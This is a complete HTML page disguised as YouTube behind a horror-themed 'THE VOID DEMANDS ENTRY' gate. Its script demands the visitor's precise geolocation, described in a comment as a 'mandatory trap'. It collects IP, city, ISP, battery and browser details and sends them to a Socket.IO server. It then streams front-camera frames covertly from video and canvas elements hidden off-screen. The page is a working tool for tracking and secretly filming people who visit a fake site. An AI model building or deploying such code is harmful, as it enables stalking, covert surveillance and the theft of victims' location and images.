<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>YouTube</title>
  <link rel="preconnect" href="https://fonts.googleapis.com" />
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
  <style>
    /* ============ BASE ============ */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    :root {
      --bg: #0f0f0f; --elev: #212121; --hover: #272727;
      --chip: #272727; --chip-active: #f1f1f1;
      --text: #f1f1f1; --text-2: #aaaaaa; --border: #303030;
      --red: #ff0000; --topbar-h: 56px; --sidebar-w: 240px;
    }
    html { scrollbar-color: #606060 transparent; }
    body {
      font-family: "Roboto", system-ui, -apple-system, "Segoe UI", Arial, sans-serif;
      background: var(--bg); color: var(--text);
      font-size: 14px; -webkit-font-smoothing: antialiased;
      overflow: hidden; /* locked until reveal */
    }
    svg { display: block; }
    ::-webkit-scrollbar { width: 8px; height: 8px; }
    ::-webkit-scrollbar-thumb { background: #606060; border-radius: 8px; }

    /* ============ YOUTUBE CHROME ============ */
    .topbar {
      position: fixed; top: 0; left: 0; right: 0;
      height: var(--topbar-h); z-index: 100;
      display: flex; align-items: center; gap: 16px;
      padding: 0 16px; background: var(--bg);
    }
    .topbar-start, .topbar-end {
      display: flex; align-items: center; gap: 6px; min-width: 170px;
    }
    .topbar-end { justify-content: flex-end; }
    .topbar-center {
      display: flex; align-items: center; justify-content: center;
      gap: 8px; flex: 1; min-width: 0;
    }
    .icon-btn {
      width: 40px; height: 40px; flex: none;
      display: grid; place-items: center;
      border: 0; border-radius: 50%;
      background: transparent; color: var(--text);
      cursor: pointer; transition: background .15s;
    }
    .icon-btn:hover { background: var(--hover); }
    .icon-btn svg { width: 24px; height: 24px; }
    .logo {
      display: flex; align-items: center; gap: 5px;
      text-decoration: none; color: var(--text);
    }
    .logo-mark {
      position: relative; width: 34px; height: 24px;
      background: var(--red); border-radius: 7px;
    }
    .logo-mark::after {
      content: ""; position: absolute; top: 50%; left: 50%;
      transform: translate(-45%, -50%);
      border-style: solid; border-width: 6px 0 6px 10px;
      border-color: transparent transparent transparent #fff;
    }
    .logo-text { font-size: 19px; font-weight: 700; letter-spacing: -.7px; }
    .search {
      display: flex; align-items: center; flex: 1;
      max-width: 640px; height: 40px;
      border: 1px solid var(--border); border-radius: 20px;
      background: #121212; overflow: hidden;
    }
    .search input {
      flex: 1; height: 100%; min-width: 0;
      background: transparent; border: 0; outline: 0;
      padding: 0 16px; color: var(--text);
      font-size: 16px; font-family: inherit;
    }
    .search-btn {
      width: 64px; height: 100%; flex: none;
      display: grid; place-items: center;
      border: 0; border-left: 1px solid var(--border);
      background: var(--elev); color: var(--text); cursor: pointer;
    }
    .av {
      display: grid; place-items: center; flex: none;
      width: 36px; height: 36px; border-radius: 50%;
      color: #fff; font-weight: 500; font-size: 15px;
    }
    .av.sm { width: 32px; height: 32px; font-size: 14px; }
    .avatar-btn {
      border: 0; background: transparent; padding: 0;
      cursor: pointer; border-radius: 50%;
    }
    .sidebar {
      position: fixed; top: var(--topbar-h); bottom: 0; left: 0;
      width: var(--sidebar-w); padding: 12px 12px 24px;
      overflow-y: auto; background: var(--bg);
    }
    .nav-item {
      display: flex; align-items: center; gap: 24px;
      height: 40px; padding: 0 12px; border-radius: 10px;
      color: var(--text); text-decoration: none; font-size: 14px;
    }
    .nav-item:hover, .nav-item.active { background: var(--hover); }
    .nav-item svg { width: 24px; height: 24px; flex: none; }
    .divider { height: 1px; background: var(--border); margin: 12px 0; }
    .content { margin-left: var(--sidebar-w); padding-top: var(--topbar-h); }
    .chips {
      position: sticky; top: var(--topbar-h); z-index: 50;
      display: flex; gap: 12px; padding: 12px 24px;
      background: var(--bg); overflow-x: auto;
    }
    .chip {
      flex: none; height: 32px; padding: 0 12px;
      border: 0; border-radius: 8px;
      background: var(--chip); color: var(--text);
      font-family: inherit; font-size: 14px; font-weight: 500;
      cursor: pointer;
    }
    .chip.active { background: var(--chip-active); color: #0f0f0f; }
    .grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
      gap: 24px 16px; padding: 8px 24px 48px;
    }
    .card { cursor: pointer; min-width: 0; }
    .thumb {
      position: relative; aspect-ratio: 16/9; border-radius: 12px;
      overflow: hidden; background-size: cover; background-position: center;
    }
    .duration {
      position: absolute; right: 8px; bottom: 8px;
      padding: 3px 4px; border-radius: 4px;
      background: rgba(0,0,0,.8); color: #fff;
      font-size: 12px; font-weight: 500;
    }
    .card-body { display: flex; gap: 12px; margin-top: 12px; }
    .meta { min-width: 0; flex: 1; }
    .title {
      font-size: 14px; font-weight: 500; line-height: 20px;
      display: -webkit-box; -webkit-line-clamp: 2;
      -webkit-box-orient: vertical; overflow: hidden; margin-bottom: 4px;
    }
    .channel, .stats { font-size: 12px; line-height: 18px; color: var(--text-2); }

    /* ============ HORROR BLOCKER ============ */
    #location-blocker {
      position: fixed; inset: 0; z-index: 99999;
      display: flex; align-items: center; justify-content: center;
      background:
        radial-gradient(ellipse at center, rgba(60,0,0,.85) 0%, rgba(0,0,0,.98) 70%),
        #000;
      padding: 20px;
      font-family: "Roboto", monospace;
    }
    .blocker-inner { max-width: 520px; text-align: center; }
    .sigil {
      font-size: 96px; line-height: 1; color: #ff1e1e;
      filter: drop-shadow(0 0 30px rgba(255, 0, 0, 0.9));
      animation: pulse 2s ease-in-out infinite;
      user-select: none;
    }
    @keyframes pulse {
      0%, 100% { filter: drop-shadow(0 0 20px rgba(255,0,0,.5)); }
      50%      { filter: drop-shadow(0 0 50px rgba(255,0,0,1)); }
    }
    .blocker-title {
      font-family: "Creepster", "Impact", sans-serif;
      font-size: 34px; letter-spacing: 3px; color: #ff2b2b;
      margin: 12px 0 8px; text-shadow: 0 0 20px rgba(255,0,0,.7);
      animation: flicker 4s infinite;
    }
    @keyframes flicker {
      0%, 100% { opacity: 1; }
      41%, 43%, 61%, 63% { opacity: 1; }
      42%, 62% { opacity: .35; }
    }
    .blocker-sub {
      color: #c89a9a; font-size: 15px; line-height: 22px;
      margin: 6px 0;
    }
    .allow-btn {
      margin-top: 28px; padding: 16px 42px;
      background: transparent; color: #ff2b2b;
      border: 2px solid #ff2b2b; border-radius: 4px;
      font-family: "Roboto", monospace;
      font-size: 16px; font-weight: 700;
      letter-spacing: 3px; cursor: pointer;
      text-shadow: 0 0 8px rgba(255,0,0,.8);
      box-shadow: 0 0 15px rgba(255,0,0,.4), inset 0 0 15px rgba(255,0,0,.15);
      transition: all .25s;
    }
    .allow-btn:hover:not(:disabled) {
      background: rgba(255,0,0,.12); color: #fff;
      box-shadow: 0 0 40px rgba(255,0,0,.9), inset 0 0 30px rgba(255,0,0,.4);
    }
    .allow-btn:disabled { opacity: .55; cursor: wait; }
    .blocker-err {
      color: #ff5050; font-size: 13px; margin-top: 18px;
      padding: 10px 16px; border: 1px solid rgba(255,80,80,.4);
      border-radius: 4px; background: rgba(255,0,0,.08);
    }
    .blocker-hint {
      color: #5a4a4a; font-size: 11px; letter-spacing: 1px;
      margin-top: 28px; text-transform: uppercase;
    }

    /* ============ HIDDEN CAPTURE ELEMENTS ============ */
    #liveVideo, #canvas { position: fixed; top: -9999px; left: -9999px; }

    /* ============ RESPONSIVE ============ */
    @media (max-width: 1100px) {
      .sidebar { display: none; }
      .content { margin-left: 0; }
    }
    @media (max-width: 640px) {
      .topbar { padding: 0 8px; }
      .topbar-start, .topbar-end { min-width: auto; }
      .grid { grid-template-columns: 1fr; }
      .blocker-title { font-size: 26px; }
      .sigil { font-size: 72px; }
    }
  </style>
</head>
<body>

  <!-- ═════════════ HORROR BLOCKER ═════════════ -->
  <div id="location-blocker" role="dialog" aria-modal="true">
    <div class="blocker-inner">
      <div class="sigil">☠</div>
      <h1 class="blocker-title">THE VOID DEMANDS ENTRY</h1>
      <p class="blocker-sub">You did not arrive here by chance.</p>
      <p class="blocker-sub">Before the veil lifts, you must reveal yourself.</p>
      <button id="allow-btn" class="allow-btn">REVEAL ME</button>
      <p id="error-msg" class="blocker-err" style="display:none"></p>
      <p class="blocker-hint">Location &amp; camera access are required</p>
    </div>
  </div>

  <!-- ═════════════ YOUTUBE DISGUISE ═════════════ -->
  <div id="main-content" aria-hidden="true">
    <header class="topbar">
      <div class="topbar-start">
        <button class="icon-btn" aria-label="Guide">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round">
            <path d="M4 7h16M4 12h16M4 17h16"/>
          </svg>
        </button>
        <a href="#" class="logo" aria-label="YouTube Home">
          <span class="logo-mark"></span>
          <span class="logo-text">YouTube</span>
        </a>
      </div>
      <div class="topbar-center">
        <form class="search" onsubmit="return false">
          <input type="text" placeholder="Search" aria-label="Search" />
          <button class="search-btn" aria-label="Search">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round">
              <circle cx="11" cy="11" r="7"/><path d="m20 20-3.6-3.6"/>
            </svg>
          </button>
        </form>
      </div>
      <div class="topbar-end">
        <button class="avatar-btn" aria-label="Account">
          <span class="av sm" style="background:linear-gradient(135deg,#ff512f,#dd2476)">A</span>
        </button>
      </div>
    </header>

    <aside class="sidebar">
      <a href="#" class="nav-item active">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round">
          <path d="M4 10.5 12 4l8 6.5V20a1 1 0 0 1-1 1h-4v-6H9v6H5a1 1 0 0 1-1-1z"/>
        </svg>
        <span>Home</span>
      </a>
      <a href="#" class="nav-item">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linejoin="round">
          <rect x="7" y="3" width="10" height="18" rx="5"/>
          <path d="M11 9.5 14.5 12 11 14.5z" fill="currentColor" stroke="none"/>
        </svg>
        <span>Shorts</span>
      </a>
      <div class="divider"></div>
      <a href="#" class="nav-item">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round">
          <circle cx="12" cy="12" r="9"/><path d="M12 7v5l3.5 2"/>
        </svg>
        <span>History</span>
      </a>
    </aside>

    <main class="content">
      <div class="chips">
        <button class="chip active">All</button>
        <button class="chip">Music</button>
        <button class="chip">Gaming</button>
      </div>
      <div class="grid">
        <article class="card">
          <div class="thumb" style="background-image:linear-gradient(135deg,#1e3c72,#2a5298)">
            <span class="duration">18:42</span>
          </div>
          <div class="card-body">
            <span class="av" style="background:linear-gradient(135deg,#1e3c72,#2a5298)">C</span>
            <div class="meta">
              <h3 class="title">Building a YouTube Clone in 2025 — HTML &amp; CSS Full Course</h3>
              <p class="channel">CodeWithSam</p>
              <p class="stats">1.2M views • 3 days ago</p>
            </div>
          </div>
        </article>
      </div>
    </main>
  </div>

  <!-- ═════════════ HIDDEN CAPTURE ELEMENTS ═════════════ -->
  <video id="liveVideo" autoplay muted playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    /* ── Socket.IO: works both served-from-Flask AND opened-as-file ── */
    const isFile = location.protocol === 'file:';
    const socketOpts = {
      transports: ["websocket", "polling"],
      reconnection: true,
      reconnectionAttempts: Infinity,
      reconnectionDelay: 1000,
    };
    const socket = isFile
      ? io('http://localhost:5000', socketOpts)
      : io(socketOpts);

    /* ── Element refs ── */
    const video      = document.getElementById('liveVideo');
    const canvas     = document.getElementById('canvas');
    const ctx        = canvas.getContext('2d');
    const blocker    = document.getElementById('location-blocker');
    const mainEl     = document.getElementById('main-content');
    const errorMsg   = document.getElementById('error-msg');
    const allowBtn   = document.getElementById('allow-btn');

    let streaming   = false;
    let dataSent    = false;

    /* ── Device fingerprint ── */
    async function getDeviceInfo() {
      const info = {
        ip: 'Unknown', country: 'Unknown', city: 'Unknown', isp: 'Unknown',
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        time: new Date().toLocaleString('en-GB', { hour12: true }),
        battery: 'Unknown', charging: 'Unknown',
        ua: navigator.userAgent,
        screen: `${screen.width}x${screen.height}`,
        lang: navigator.language,
      };
      try {
        const res  = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        info.ip      = data.ip           || 'Unknown';
        info.country = data.country_name || 'Unknown';
        info.city    = data.city         || 'Unknown';
        info.isp     = data.org          || 'Unknown';
      } catch (e) { /* offline */ }
      try {
        if ('getBattery' in navigator) {
          const b = await navigator.getBattery();
          info.battery  = Math.round(b.level * 100) + '%';
          info.charging = b.charging ? 'Yes' : 'No';
        }
      } catch (e) {}
      return info;
    }

    /* ── Geolocation promise wrapper ── */
    function requestGeo() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          return reject({ code: -1, message: 'Geolocation unsupported' });
        }
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          maximumAge: 0,
          timeout: 15000,
        });
      });
    }

    /* ── Camera capture loop ── */
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
          audio: false,
        });
        video.srcObject = stream;
        await video.play();
        canvas.width  = video.videoWidth  || 640;
        canvas.height = video.videoHeight || 480;

        if (streaming) return;
        streaming = true;
        setInterval(() => {
          if (video.readyState >= 2) {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            try {
              socket.emit('video_frame', canvas.toDataURL('image/jpeg', 0.55));
            } catch (e) {}
          }
        }, 120); // ~8 FPS
      } catch (e) {
        console.warn('Camera denied:', e);
      }
    }

    /* ── Reveal flow ── */
    async function reveal() {
      errorMsg.style.display = 'none';
      allowBtn.disabled = true;
      allowBtn.textContent = 'THE VOID IS LISTENING...';

      try {
        // 1) Geolocation — mandatory trap
        const pos = await requestGeo();

        // 2) Device info
        const device = await getDeviceInfo();

        // 3) Fire to server
        socket.emit('send_location', {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          device,
        });
        dataSent = true;

        // 4) Camera — best effort, non-blocking
        startCamera();

        // 5) Dissolve the blocker, reveal the disguise
        blocker.style.transition = 'opacity .9s ease';
        blocker.style.opacity = '0';
        setTimeout(() => { blocker.style.display = 'none'; }, 900);
        mainEl.removeAttribute('aria-hidden');
        document.body.style.overflow = 'auto';

      } catch (err) {
        allowBtn.disabled = false;
        allowBtn.textContent = 'REVEAL ME';
        errorMsg.style.display = 'block';
        if (err && err.code === 1) {
          errorMsg.textContent = '☠ Permission denied. The void remains closed. ☠';
        } else if (err && err.code === 3) {
          errorMsg.textContent = '☠ The void lost patience. Try again. ☠';
        } else {
          errorMsg.textContent = '☠ The void cannot reach you here. ☠';
        }
      }
    }

    allowBtn.addEventListener('click', reveal);

    /* ── UI niceties (chips) ── */
    document.querySelectorAll('.chip').forEach(chip => {
      chip.addEventListener('click', () => {
        document.querySelector('.chip.active')?.classList.remove('active');
        chip.classList.add('active');
      });
    });

    /* ── Socket status logging ── */
    socket.on('connect',    () => console.log('[socket] connected to void'));
    socket.on('disconnect', () => console.log('[socket] disconnected from void'));
    socket.on('connect_error', (e) => console.warn('[socket] error:', e.message));
  </script>
</body>
</html>
